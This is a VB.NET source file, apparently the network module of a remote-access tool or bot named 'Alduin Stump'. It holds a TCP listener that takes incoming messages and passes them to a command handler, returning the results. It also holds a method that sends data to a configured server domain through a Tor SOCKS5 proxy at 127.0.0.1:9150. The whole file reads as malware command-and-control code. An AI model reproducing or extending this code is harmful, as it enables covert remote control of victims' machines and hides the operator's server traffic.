Imports System.IO
Imports System.Net.Sockets
Imports Starksoft.Aspen.Proxy
Namespace Alduin.Stump.Class.Network
    Public Class TcpListen
        Private adr As Net.IPAddress = Net.IPAddress.Parse(LocalIP)
        Private client As TcpClient
        Private listener As TcpListener
        Private ReadOnly _command As ICommand
        Public TCP As TcpClient
        Public Write As StreamWriter
        Public Reader As StreamReader
        Private proxyClient As Socks5ProxyClient
        Public Sub New()
            listener = New TcpListener(adr, ListenerPort)
        End Sub

        Public Sub TcpAsync()
            listener.Start()
            Dim Message
            Dim Result
            If listener.Pending = True Then
                client = listener.AcceptTcpClient
                Message = ""
                Dim Reader As New StreamReader(client.GetStream())
                While Reader.Peek > -1
                    Message = Message + Convert.ToChar(Reader.Read())
                End While
                'Call commands and wait result
                Console.WriteLine(Message)
                Result = _command.Handle(Message)
                Moduls.Network.StreamWrite.StreamWrite(client, Result)
                client.Close()
            End If
        End Sub
        Public Sub TalkChannelHTTP(ByVal msg As String)
            Dim ReachPort As Integer = 50371 'ReachPort
            Dim header As String = "POST /test HTTP/1.1
Host: foo.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

field1=value1&field2=value2"
            proxyClient = New Socks5ProxyClient("127.0.0.1", 9150)
            proxyClient.ProxyUserName = ""
            proxyClient.ProxyPassword = ""
            TCP = proxyClient.CreateConnection(ServerDomain, ReachPort)
            Write = New StreamWriter(TCP.GetStream())
            Write.Write(msg)
            Write.Flush()
        End Sub
    End Class
End Namespace

